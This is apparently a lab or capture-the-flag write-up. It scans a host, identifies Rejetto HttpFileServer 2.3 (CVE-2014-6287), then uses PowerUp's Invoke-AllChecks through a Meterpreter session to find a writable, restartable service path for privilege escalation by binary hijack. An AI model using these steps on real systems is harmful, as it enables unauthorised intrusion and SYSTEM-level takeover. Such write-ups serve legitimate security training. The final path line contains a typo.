## Scanning
```
nmap 10.10.148.211
nmap -p 8080 -sV 10.10.148.211
# 8080/tcp open  http    HttpFileServer httpd 2.3
```

## Exploit 
Rejetto HTTP File Server - CVE-2014-6287

```
upload https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
load powershell 
powershell_shell
. .\PowerUp.ps1 # to load ps1

Invoke-AllChecks
#  Invoke-AllChecks function, which runs through all relevant checks for the machine and outputs a status report
# AdvancedSystemCareService9
# CanRestart option that is set to true

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths


# The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

C:\Program Files (x86)\IObit\Advanced/ SystemCare\ASCService.exe
